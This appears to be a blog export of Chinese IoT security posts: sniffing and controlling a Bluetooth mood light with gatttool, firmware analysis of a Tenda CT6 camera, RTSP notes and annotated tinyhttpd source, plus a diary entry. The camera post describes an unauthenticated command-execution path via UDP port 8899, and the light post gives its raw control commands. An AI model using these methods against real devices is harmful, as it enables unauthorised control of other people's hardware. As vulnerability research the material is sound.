![image-20230111102119282](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230111102119282.png) 该设备与任意 master 通信的数据包都可以被抓取，包括连接过程和连接之后的数据 包。双击任意一个 packet 可查看具体内容，例如该设备广播包抓取内容如下: Hello World其实是对一个简单的蓝牙氛围灯的嗅探与攻击，其功能比较简单且无数据加密。 app长这样 分析使用wireshark来嗅探相关信息。 使用手机app连接灯。 有很多Empty PDU空包，使用 !(btle.data_header.llid &#x3D;&#x3D; 0x1) 来过滤 开关从手机发送打开命令 其对0x000e特征发送了bc01010155 关闭命令 对0x000e特征发送了bc01010055 通过对比，第5位的01&#x2F;00控制灯的打开和关闭。 改变速度该灯可以调节灯块闪烁速度。从0-100 修改为0 修改为100 对比第四位从00-64转换为10进制，即0-100 所以通过修改该参数可控制速度。 bc0801 00 55 改变灵敏度与速度类似 修改为0 修改为100 特征与速度类似 改变模式第一个模式 最后一个模式 所以模式从01-99共153个。 bc060200 01 55 改变颜色 通过对多个颜色的分析，数据格式应该为bc04060 11c 0 196 000055，其中11c控制亮度，196控制颜色。 通过上面的分析，发现都是通过0x000e来进行操作。 攻击这里利用linux蓝牙栈（blueZ）来操作。 sudo apt-get install bluez 安装完成后会有hcitool和gatttool两个工具，分别进行扫描和连接以及数据的读写。 硬件使用一个蓝牙4.0的免驱适配器。 如果你的电脑虚拟机无法获取到主机网卡，可以在vm设置中取消与linux共享蓝牙设备，再接入外接适配器。 hciconfig用于配置蓝牙设备。我们可以运行这个命令来列出连接到我们计算机的 BLE 适配器以及它们的基本信息。 hciconfig hciX up 启用名为 hciX 的蓝牙设备 hciconfig hciX down 停用名为 hciX 的蓝牙设备 如果之后扫描和连接过程中出现什么问题，可以通过这两条命令来重启蓝牙设备尝试解决。 hcitoolhcitool 用于配置蓝牙连接，并向蓝牙设备发送一些特殊命令。 hcitool -i hciX 使用 hciX 接口，如果不指定，默认使用第一个可用接口。 hcitool scan 扫描处于发现模式的传统蓝牙设备。 hcitool lescan 扫描 BLE 设备。 Gattoolgatttool -I 以交互模式启动 gatttool。 gatttool -t random -b [adr] -I 使用随机 LE 地址在交互模式下启动 gattool。连接到地址为 adr 的远程蓝牙设备。 primary 检查已连接 BLE 设备的可用服务。 characteristic 检查已连接 BLE 设备的可用属性，以便从中读取数据。 char-desc 特征描述符的发现。检查 n 个 handle。 char-read-hnd 使用 handle 读取属性 。 char-write-req 向 handle 写入值。 通过扫描获取的灯泡mac地址ff:22:09:30:00:18 使用gatttool连接 有时候连接成功了但是会报错，需要再连接下。 使用primary查看服务 使用Characteristics查看特征 在找到服务和特征后，需要知道读&#x2F;写数据的 handle。这可以使用char-desc命令得到。 在找到 handle 后，使用命令char-read-hnd &lt;handle&gt;从 handle 中读取数据。 也可以使用char-read-uuid &lt;uuid&gt;来读取。 从前面嗅探中可知，该灯是通过0x000e来写入数据。 可以命令char-write-req &lt;handle&gt; &lt;value&gt; 向 handle 中写入值。 关机： 如果char-write-req报错，可以使用char-write-cmd替换。 不过注意cmd是没有返回内容的，只能从设备反应来查看是否执行成功。 以上就是入门BLE协议的相关知识，关与协议的工具，有个比较强的大的框架mirage，不过相关文章很少，需要自行研究。 https://github.com/RCayre/mirage 之后也会尝试更多相关设备的研究。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"碎碎念","slug":"余/socute","date":"2022-11-08T05:56:54.000Z","updated":"2022-11-08T05:56:54.000Z","comments":true,"path":"article/f3404829.html","link":"","permalink":"http://example.com/article/f3404829.html","excerpt":"","text":"终于要下雨了，孩子要热死了 什么都不想干，当个废物多好 今天看到一段话 今天37度，我坐在便利店门口抽着烟，看着对面青春飞扬的初中生中考，我才发现我已经离开校园很多年了。可是很奇怪，好像校园青春就在昨天，仿佛天边的云伸手就能摸到。 还是书读得少了，想感慨青春易逝也没感慨出来。只记起陶渊明的一句诗“忆我少壮时，无乐自欣愉。” 青春真是充满了力量和脆弱。 今天的壁纸 杭州一行，玩是没玩明白，倒是回来拉两天肚子，再也不参加这种活动了。 这次的一些照片。 哦对，女生说暂时不想谈恋爱是指不想跟你谈。记得不要死皮赖脸。 哎呀终于解封了 属实是封了快一个月 让我来显摆一下封控时候搞得能吃的哈哈哈 我觉得还可以哈哈哈 人一旦宅久了，确实容易废。 哦对，今晚有月全食，小丫头跟我说那是血月不吉利。 开玩笑，我可是唯物主义战士。 每次碎碎念都有好多骚话，却总写不出来。 算了算了无所谓的。 最后分享下最近的壁纸吧","categories":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}],"tags":[],"keywords":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}]},{"title":"tendaCT6摄像头固件分析","slug":"iot/tendaCT6","date":"2022-09-28T06:22:42.000Z","updated":"2022-09-28T06:22:42.000Z","comments":true,"path":"article/77f90bb.html","link":"","permalink":"http://example.com/article/77f90bb.html","excerpt":"","text":"最近逛tenda发现新上了一款摄像头，这不下载个固件看看？ 直接binwalk一把梭 firmAE这里先不看文件系统，尝试下用firmAE来模拟固件 sudo .&#x2F;run.sh -c ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin 需要使用root权限来执行firmAE文件夹下的run.sh，-c参数为check，来检查是否可以模拟，一般check完成后模拟起来会很快，但check很慢，ipc算是项目名字可定义即可 sudo .&#x2F;run.sh -d ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin check完成后可以使用 -a参数直接执行，或者-d参数以debug模式执行，debug模式 这个固件能模拟，但是不能完全模拟，知道用法就可了。 如何找到一个固件的服务进行分析当解包一个固件的时候发现，没有http服务，没有html页面，没有httpd，boa，uhttpd，lighttpd等。 某些摄像头经常见到这个问题。 这个时候需要从启动来一点点看找到他启动了什么服务。 当然如果有设备并且获取了串口shell，也可以直接查看 这里推荐个超好用的命令 find 大概用法 ​ find . -name “httpd” ​ find . -name “*cfg” 支持*这样的正则匹配 linux启动最先看inittab，一般在etc下面 启动rcS，一般都在&#x2F;etc&#x2F;init.d&#x2F;rcS 这里就是执行了init.d文件夹下的文件 S00devs 里使用mknod创建Linux中的符设备文件和块设备文件，不重要 S01udev 它主要的功能是管理&#x2F;dev目录底下的设备节点。它同时也是用来接替devfs及热插拔的功能，这意味着它要在添加&#x2F;删除硬件时处理&#x2F;dev目录以及所有用户空间的行为。也不重要 S80network中也并没有发现启动的服务 那返回到rcS，执行完S*之后，执行了&#x2F;opt&#x2F;app&#x2F;init.sh 但opt中没有任何文件，这个时候就需要上面说的find命令了。 吧squashfs-root-0和-1的所有内容移动到opt下 运行network_setup.sh，启动telnet服务，将execute放到tmp，启动execute服务，运行daemon.sh network_setup.sh中没有服务启动，不赘述 daemon.sh中执行了tdseq服务 从先后顺序来看，来分析个execute。 这里tenda摄像头设备基本都是armel，自行file即可 executemain中可以看到socket函数（具体请看socket网络编程） 这里绑定了8899端口，但是并没有监听。启动下看看 发现8899的udp协议。 可以使用netcat连接 这里分析下udp协议做了什么 通过recvfrom获取到传入的内容存放到v13，创建新线程将内容传进去。 在线程中，吧参数给了v9，然后注意这个v17获取了前四位做了个判断。 以为是magicnumber，满足条件执行my_system，但是这个magicnumbe没有做任何奇奇怪怪的判断。 所以可以直接命令执行，但是还是好奇这个sub_10D64做了什么。 点进去？？？？？？？？？？？？？？？？？？？？？？？？？？？？ 不是，脱裤子放屁都没这么放的吧。 开发者这么做，一定有他的用(大)意(病) 查了半天，也没发现这里if分支的区别。 这里应该算是个命令执行了。直接来吧（jitang）！ qemu user导致的问题这里本来使用的 sudo chroot . .&#x2F;qemu-arm-static .&#x2F;opt&#x2F;app&#x2F;execute 启动的，但是命令执行死活不成功。 gdb调试了一天，愣是没找到问题。 第二天尝试了下qemu-arm-static -L . .&#x2F;opt&#x2F;app&#x2F;execute 可以了。。。，这里xxxx就是为了填充magic number，可以写脚本传入0x00来执行到sub函数。 所以各位有时候遇到这种问题可以看一下是否是qemu的问题。 当然，如果像我一样，有一个同架构的其他设备，又刚好有该设备的rce，就可以搞点牛头人操作了。 关于gdb多线程调试gdb多线程调试，大概说一下怎么搞。 使用qemu自带的-g参数启动远程server qemu-arm-static -L . -g 1234 .&#x2F;opt&#x2F;app&#x2F;execute # 1234为监听的端口 使用gdb-multiarch来进行调试 gdb-multiarch opt&#x2F;app&#x2F;execute target remote 127.0.0.1 在子线程函数中下个断点，我这边位置是0x000110E8 使用c来执行程序 使用netcat连接udp nc -uvv 127.0.0.1 8899 连上后gdb中能发现新线程 info threads ID 2 就是断下来的心线程，使用thread 2来切换线程 thread 2 此时pc指向我们的断点，要回主线程，只需要再次切换即可。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"协议-rtsp","slug":"iot/协议-rtsp","date":"2022-09-21T02:15:51.000Z","updated":"2022-09-21T02:15:51.000Z","comments":true,"path":"article/ccd0d78.html","link":"","permalink":"http://example.com/article/ccd0d78.html","excerpt":"","text":"最近在看摄像头，刚好碰到rtsp协议的东西，寻思学习记录下。 这里csdn的JT同学师傅的博客写的很不错。 rtsp是一个实时传输流协议，简单点说就是用来看视频的。 rtsp通常包括rtp，rtcp，rtsp rtsp负责客户端与服务端的请求和响应 rtcp负责在RTP传输过程中提供传输信息 rtp负责传输媒体数据 rtsp承载与rtp和rtcp之上，rtsp并不会发送媒体数据，而是使用rtp协议传输 rtp并没有规定发送方式，可以选择udp发送或者tcp发送","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"协议-tinyhttpd","slug":"iot/协议-tinyhttpd","date":"2022-08-01T05:04:55.000Z","updated":"2022-08-01T05:04:55.000Z","comments":true,"path":"article/68d281b.html","link":"","permalink":"http://example.com/article/68d281b.html","excerpt":"","text":"一个非常轻量的httpd服务器，只有500行代码。 我后边用python写了一个很简陋的几十行代码的，可以看下那个来简单看一下。 这里只看了网络编程的一些东西，进程通信挖个坑，下次填。 很适合 https://github.com/EZLippi/Tinyhttpd.git 编译方式是直接make 编译执行后发现开启4000端口 默认加载htdocs下的index.html 当去访问一个不存在的文件a.html cgi问题 这里写一个简单的shell cgi来替代自带的cgi #!/bin/bash echo &quot;Content-Type: text/html&quot; echo echo &quot;&lt;HTML&gt;&lt;BODY&gt;&quot; echo &quot;&lt;CENTER&gt;Today is:&lt;/CENTER&gt;&quot; echo &quot;&lt;CENTER&gt;&lt;B&gt;&quot; date echo &quot;&lt;/B&gt;&lt;/CENTER&gt;&quot; echo &quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot; 访问cgi文件，发现cgi并未被执行 是因为没有执行权限，所以导致直接被当成静态文件，而有执行权限的话，静态文件也会被当作cgi执行。 尝试将所有的文件赋予权限 chmod 777 .&#x2F;* index页面无法正常显示 执行方式可以通过下图来理解 注释代码项目放代码阅读时的代码放gitee了需要可自行下载：https://gitee.com/p1piyang/backward-analysis/ /* J. David&#x27;s webserver */ /* This is a simple webserver. * Created November 1999 by J. David Blackstone. * CSE 4344 (Network concepts), Prof. Zeigler * University of Texas at Arlington */ /* This program compiles for Sparc Solaris 2.6. * To compile for Linux: * 1) Comment out the #include &lt;pthread.h&gt; line. * 2) Comment out the line that defines the variable newthread. * 3) Comment out the two lines that run pthread_create(). * 4) Uncomment the line that runs accept_request(). * 5) Remove -lsocket from the Makefile. */ #include &lt;stdio.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;unistd.h&gt; #include &lt;ctype.h&gt; #include &lt;strings.h&gt; #include &lt;string.h&gt; #include &lt;sys/stat.h&gt; #include &lt;pthread.h&gt; #include &lt;sys/wait.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #define ISspace(x) isspace((int)(x)) #define SERVER_STRING &quot;Server: jdbhttpd/0.1.0\\r\\n&quot; #define STDIN 0 #define STDOUT 1 #define STDERR 2 void accept_request(void *); void bad_request(int); void cat(int, FILE *); void cannot_execute(int); void error_die(const char *); void execute_cgi(int, const char *, const char *, const char *); int get_line(int, char *, int); void headers(int, const char *); void not_found(int); void serve_file(int, const char *); int startup(u_short *); void unimplemented(int); /**********************************************************************/ /* A request has caused a call to accept() on the server port to * return. Process the request appropriately. * Parameters: the socket connected to the client */ /**********************************************************************/ void accept_request(void *arg) &#123; int client = (intptr_t)arg; char buf[1024]; size_t numchars; char method[255]; char url[255]; char path[512]; size_t i, j; struct stat st; //文件信息 //struct stat&#123; // dev_t st_dev; /* ID of device containing file */文件使用的设备号 // ino_t st_ino; /* inode number */ 索引节点号 // mode_t st_mode; /* protection */ 文件对应的模式，文件，目录等 // nlink_t st_nlink; /* number of hard links */ 文件的硬连接数 // uid_t st_uid; /* user ID of owner */ 所有者用户识别号 // gid_t st_gid; /* group ID of owner */ 组识别号 // dev_t st_rdev; /* device ID (if special file) */ 设备文件的设备号 // off_t st_size; /* total size, in bytes */ 以字节为单位的文件容量 // blksize_t st_blksize; /* blocksize for file system I/O */ 包含该文件的磁盘块的大小 // blkcnt_t st_blocks; /* number of 512B blocks allocated */ 该文件所占的磁盘块 // time_t st_atime; /* time of last access */ 最后一次访问该文件的时间 // time_t st_mtime; /* time of last modification */ /最后一次修改该文件的时间 // time_t st_ctime; /* time of last status change */ 最后一次改变该文件状态的时间 //&#125;; int cgi = 0; /* becomes true if server decides this is a CGI * program */ char *query_string = NULL; //读取http请求的第一行数据 numchars = get_line(client, buf, sizeof(buf)); i = 0; j = 0; //吧请求方法存到，，method中 while (!ISspace(buf[i]) &amp;&amp; (i &lt; sizeof(method) - 1)) &#123; method[i] = buf[i]; i++; &#125; j=i; method[i] = &#x27;\\0&#x27;; //判断如果不是get或者post方法，发送response给客户端表示无法实现 if (strcasecmp(method, &quot;GET&quot;) &amp;&amp; strcasecmp(method, &quot;POST&quot;)) &#123; //使用sprintf函数将要返回的内容给buf,使用send函数返回给client unimplemented(client); return; &#125; //判断为post方法 if (strcasecmp(method, &quot;POST&quot;) == 0) cgi = 1; i = 0; //跳过空格 while (ISspace(buf[j]) &amp;&amp; (j &lt; numchars)) j++; //获取url while (!ISspace(buf[j]) &amp;&amp; (i &lt; sizeof(url) - 1) &amp;&amp; (j &lt; numchars)) &#123; url[i] = buf[j]; i++; j++; &#125; url[i] = &#x27;\\0&#x27;; //get方法 if (strcasecmp(method, &quot;GET&quot;) == 0) &#123; query_string = url; //用于记录带参数的GET方法请求中 ‘？’后的参数 while ((*query_string != &#x27;?&#x27;) &amp;&amp; (*query_string != &#x27;\\0&#x27;)) query_string++; if (*query_string == &#x27;?&#x27;) &#123; cgi = 1; *query_string = &#x27;\\0&#x27;; query_string++; &#125; &#125; //将htdocs与url拼接到一起给path，即我们的资源文件都在htdocs下 sprintf(path, &quot;htdocs%s&quot;, url); //判断如果URL的最后一位是‘/’，加上index.html if (path[strlen(path) - 1] == &#x27;/&#x27;) strcat(path, &quot;index.html&quot;); //定义函数：int stat(const char * file_name, struct stat *buf); //函数说明：stat()用来将参数file_name 所指的文件状态, 复制到参数buf 所指的结构中。 //返回值：执行成功则返回0，失败返回-1，错误代码存于errno。 //这里改了一下，把东西处理下可以看到是处理包头。 //根据执行来看，这个if判断 if (stat(path, &amp;st) == -1) &#123; while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) /* read &amp; discard headers */ &#123; numchars = get_line(client, buf, sizeof(buf)); char *test = buf; printf(&quot;for: %s&quot;, test); &#125; //打印404返回页面 not_found(client); &#125; else &#123; // 文件存在，那则跟常量S_IFMT相与，相与之后的值可以用来判断该文件是什么类型的 // 此处与上边判断路径是不是以 \\ 结尾的地方作用一样，可以省略，留着可重复确认。 if ((st.st_mode &amp; S_IFMT) == S_IFDIR) strcat(path, &quot;/index.html&quot;); //判断权限的，前面有说过的 if ((st.st_mode &amp; S_IXUSR) || (st.st_mode &amp; S_IXGRP) || (st.st_mode &amp; S_IXOTH) ) cgi = 1; if (!cgi) &#123; printf(&quot;nocgi\\n&quot;); //不需要cgi的 serve_file(client, path); &#125; else &#123; //需要cgi的 printf(&quot;cgi\\n&quot;); execute_cgi(client, path, method, query_string); &#125; &#125; close(client); &#125; /**********************************************************************/ /* Inform the client that a request it has made has a problem. * Parameters: client socket */ /**********************************************************************/ void bad_request(int client) &#123; char buf[1024]; sprintf(buf, &quot;HTTP/1.0 400 BAD REQUEST\\r\\n&quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;Content-type: text/html\\r\\n&quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;&lt;P&gt;Your browser sent a bad request, &quot;); send(client, buf, sizeof(buf), 0); sprintf(buf, &quot;such as a POST without a Content-Length.\\r\\n&quot;); send(client, buf, sizeof(buf), 0); &#125; /**********************************************************************/ /* Put the entire contents of a file out on a socket. This function * is named after the UNIX &quot;cat&quot; command, because it might have been * easier just to do something like pipe, fork, and exec(&quot;cat&quot;). * Parameters: the client socket descriptor * FILE pointer for the file to cat */ /**********************************************************************/ void cat(int client, FILE *resource) &#123; char buf[1024]; //读取文件内容，发送到前端。 fgets(buf, sizeof(buf), resource); while (!feof(resource)) &#123; send(client, buf, strlen(buf), 0); fgets(buf, sizeof(buf), resource); &#125; &#125; /**********************************************************************/ /* Inform the client that a CGI script could not be executed. * Parameter: the client socket descriptor. */ /**********************************************************************/ void cannot_execute(int client) &#123; char buf[1024]; sprintf(buf, &quot;HTTP/1.0 500 Internal Server Error\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;P&gt;Error prohibited CGI execution.\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ /* Print out an error message with perror() (for system errors; based * on value of errno, which indicates system call errors) and exit the * program indicating an error. */ /**********************************************************************/ void error_die(const char *sc) &#123; perror(sc); exit(1); &#125; /**********************************************************************/ /* Execute a CGI script. Will need to set environment variables as * appropriate. * Parameters: client socket descriptor * path to the CGI script */ /**********************************************************************/ // cgi用于动态网页的处理 // execute_cgi函数创建了两个进程，子进程用于cgi文件的处理，父进程用于往socket读写数据 void execute_cgi(int client, const char *path, const char *method, const char *query_string) &#123; char buf[1024]; int cgi_output[2]; int cgi_input[2]; pid_t pid; int status; int i; char c; int numchars = 1; int content_length = -1; buf[0] = &#x27;A&#x27;; buf[1] = &#x27;\\0&#x27;; printf(&quot;&gt;exec cgi\\n&quot;); //get方法 if (strcasecmp(method, &quot;GET&quot;) == 0) while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) /* read &amp; discard headers */ &#123; printf(&quot;&gt;get\\n&quot;); numchars = get_line(client, buf, sizeof(buf)); &#125; //post方法 else if (strcasecmp(method, &quot;POST&quot;) == 0) /*POST*/ &#123; numchars = get_line(client, buf, sizeof(buf)); while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) &#123; // &quot;Content-Length:&quot;长度为15个字符，所以将前15个字符比较。 buf[15] = &#x27;\\0&#x27;; // 如果是Content-Length，读取这个改字段转为整数 if (strcasecmp(buf, &quot;Content-Length:&quot;) == 0) &#123; content_length = atoi(&amp;(buf[16])); printf(&quot;lenght:%d\\n&quot;,content_length); &#125; numchars = get_line(client, buf, sizeof(buf)); &#125; //无法处理的话，400错误 if (content_length == -1) &#123; bad_request(client); return; &#125; &#125; else/*HEAD or other*/ &#123; &#125; //创建管道 //子进程写管道 if (pipe(cgi_output) &lt; 0) &#123; //服务错误500 cannot_execute(client); return; &#125; //子进程写管道 if (pipe(cgi_input) &lt; 0) &#123; //服务错误500 cannot_execute(client); return; &#125; //创建子进程 if ( (pid = fork()) &lt; 0 ) &#123; cannot_execute(client); return; &#125; //响应成功 sprintf(buf, &quot;HTTP/1.0 200 OK\\r\\n&quot;); send(client, buf, strlen(buf), 0); // 这下面是另一个坑，进程通信。 if (pid == 0) /* child: CGI script */ &#123; char meth_env[255]; char query_env[255]; char length_env[255]; dup2(cgi_output[1], STDOUT); dup2(cgi_input[0], STDIN); close(cgi_output[0]); close(cgi_input[1]); sprintf(meth_env, &quot;REQUEST_METHOD=%s&quot;, method); putenv(meth_env); if (strcasecmp(method, &quot;GET&quot;) == 0) &#123; sprintf(query_env, &quot;QUERY_STRING=%s&quot;, query_string); putenv(query_env); &#125; else &#123; /* POST */ sprintf(length_env, &quot;CONTENT_LENGTH=%d&quot;, content_length); putenv(length_env); &#125; execl(path, NULL); exit(0); &#125; else &#123; /* parent */ close(cgi_output[1]); close(cgi_input[0]); if (strcasecmp(method, &quot;POST&quot;) == 0) for (i = 0; i &lt; content_length; i++) &#123; recv(client, &amp;c, 1, 0); write(cgi_input[1], &amp;c, 1); &#125; while (read(cgi_output[0], &amp;c, 1) &gt; 0) send(client, &amp;c, 1, 0); close(cgi_output[0]); close(cgi_input[1]); waitpid(pid, &amp;status, 0); &#125; &#125; /**********************************************************************/ /* Get a line from a socket, whether the line ends in a newline, * carriage return, or a CRLF combination. Terminates the string read * with a null character. If no newline indicator is found before the * end of the buffer, the string is terminated with a null. If any of * the above three line terminators is read, the last character of the * string will be a linefeed and the string will be terminated with a * null character. * Parameters: the socket descriptor * the buffer to save the data in * the size of the buffer * Returns: the number of bytes stored (excluding null) */ /**********************************************************************/ //处理包，大概流程是循环读取每个字符 //如果回车符(\\r)的后面不是换行符(\\n)或者读取失败就把当前读取的字符置为换行，从而终止循环 //如果没有成功接收到字符，以 \\n 结尾，结束循环 //最后以\\n结尾 int get_line(int sock, char *buf, int size) &#123; int i = 0; char c = &#x27;\\0&#x27;; int n; // while ((i &lt; size - 1) &amp;&amp; (c != &#x27;\\n&#x27;)) &#123; n = recv(sock, &amp;c, 1, 0); /* DEBUG printf(&quot;%02X\\n&quot;, c); */ if (n &gt; 0) &#123; if (c == &#x27;\\r&#x27;) &#123; n = recv(sock, &amp;c, 1, MSG_PEEK); /* DEBUG printf(&quot;%02X\\n&quot;, c); */ if ((n &gt; 0) &amp;&amp; (c == &#x27;\\n&#x27;)) recv(sock, &amp;c, 1, 0); else c = &#x27;\\n&#x27;; &#125; buf[i] = c; i++; &#125; else c = &#x27;\\n&#x27;; &#125; buf[i] = &#x27;\\0&#x27;; return(i); &#125; /**********************************************************************/ /* Return the informational HTTP headers about a file. */ /* Parameters: the socket to print the headers on * the name of the file */ /**********************************************************************/ //响应头 void headers(int client, const char *filename) &#123; char buf[1024]; (void)filename; /* could use filename to determine file type */ strcpy(buf, &quot;HTTP/1.0 200 OK\\r\\n&quot;); send(client, buf, strlen(buf), 0); strcpy(buf, SERVER_STRING); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-Type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); strcpy(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ /* Give a client a 404 not found status message. */ /**********************************************************************/ void not_found(int client) &#123; //将内容打印到缓存，并且发送出去 char buf[1024]; sprintf(buf, &quot;HTTP/1.0 404 NOT FOUND\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, SERVER_STRING); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-Type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;BODY&gt;&lt;P&gt;The server could not fulfill\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;your request because the resource specified\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;is unavailable or nonexistent.\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;/BODY&gt;&lt;/HTML&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ /* Send a regular file to the client. Use headers, and report * errors to client if they occur. * Parameters: a pointer to a file structure produced from the socket * file descriptor * the name of the file to serve */ /**********************************************************************/ void serve_file(int client, const char *filename) &#123; FILE *resource = NULL; int numchars = 1; char buf[1024]; buf[0] = &#x27;A&#x27;; buf[1] = &#x27;\\0&#x27;; while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;\\n&quot;, buf)) /* read &amp; discard headers */ numchars = get_line(client, buf, sizeof(buf)); //打开文件，判断是否有文件 resource = fopen(filename, &quot;r&quot;); if (resource == NULL) not_found(client); else &#123; //构造响应头给客户端 headers(client, filename); //将文件内容发送给客户端 cat(client, resource); &#125; fclose(resource); &#125; /**********************************************************************/ /* This function starts the process of listening for web connections * on a specified port. If the port is 0, then dynamically allocate a * port and modify the original port variable to reflect the actual * port. * Parameters: pointer to variable containing the port to connect on * Returns: the socket */ /**********************************************************************/ //初始化 httpd 服务，包括建立套接字，绑定端口，进行监听等。 int startup(u_short *port) &#123; int httpd = 0; int on = 1; struct sockaddr_in name; //正常的socket创建流程 httpd = socket(PF_INET, SOCK_STREAM, 0); if (httpd == -1) error_die(&quot;socket&quot;); memset(&amp;name, 0, sizeof(name)); name.sin_family = AF_INET; name.sin_port = htons(*port); name.sin_addr.s_addr = htonl(INADDR_ANY); //setsockopt()函数，用于任意类型、任意状态套接口的设置选项值 if ((setsockopt(httpd, SOL_SOCKET, SO_REUSEADDR, &amp;on, sizeof(on))) &lt; 0) &#123; error_die(&quot;setsockopt failed&quot;); &#125; //绑定socket到端口，port等于0，系统会随机分配一个端口（bind函数里实现） if (bind(httpd, (struct sockaddr *)&amp;name, sizeof(name)) &lt; 0) error_die(&quot;bind&quot;); // 这个if的作用是将自动分配的端口传给port if (*port == 0) /* if dynamically allocating a port */ &#123; socklen_t namelen = sizeof(name); // 获取socket绑定的地址信息 if (getsockname(httpd, (struct sockaddr *)&amp;name, &amp;namelen) == -1) error_die(&quot;getsockname&quot;); *port = ntohs(name.sin_port); &#125; //监听端口 if (listen(httpd, 5) &lt; 0) error_die(&quot;listen&quot;); return(httpd); &#125; /**********************************************************************/ /* Inform the client that the requested web method has not been * implemented. * Parameter: the client socket */ /**********************************************************************/ void unimplemented(int client) &#123; char buf[1024]; sprintf(buf, &quot;HTTP/1.0 501 guan zhu jia ran, dun dun jie chan\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, SERVER_STRING); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;Content-Type: text/html\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implemented\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;/TITLE&gt;&lt;/HEAD&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;BODY&gt;&lt;P&gt;if you watch this page, please follow JiaRan_Diana.\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;br/&gt;&lt;img src=&#x27;https://img2.baidu.com/it/u=2323296913,2613522307&amp;amp;fm=253&amp;amp;app=138&amp;amp;size=w931&amp;amp;n=0&amp;amp;f=JPEG&amp;amp;fmt=auto?sec=1658854800&amp;amp;t=7b90c5387e83fb57a89e051eccbb7eb9&#x27;&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); sprintf(buf, &quot;&lt;/BODY&gt;&lt;/HTML&gt;\\r\\n&quot;); send(client, buf, strlen(buf), 0); &#125; /**********************************************************************/ int main(void) &#123; int server_sock = -1; //服务端套接字接口 u_short port = 4000; //端口 int client_sock = -1;//已连接套接字描述符，初始化为-1（客户端） struct sockaddr_in client_name; socklen_t client_name_len = sizeof(client_name); pthread_t newthread; //调用startup()函数，建立一个监听套接字，在对应的端口建立httpd服务 server_sock = startup(&amp;port); printf(&quot;httpd running on port %d\\n&quot;, port); //循环调用accept()函数来等待客户端的连接，accept()会议阻塞的方式运行 //有客户端链接后返回到client_sock，去创建新线程处理请求 while (1) &#123; client_sock = accept(server_sock, (struct sockaddr *)&amp;client_name, &amp;client_name_len); if (client_sock == -1) error_die(&quot;accept&quot;); //创建新线程用accept_request()函数处理新请求，同时将客户端socket作为参数传过去 /* accept_request(&amp;client_sock); */ if (pthread_create(&amp;newthread , NULL, (void *)accept_request, (void *)(intptr_t)client_sock) != 0) perror(&quot;pthread_create&quot;); &#125; close(server_sock); return(0); 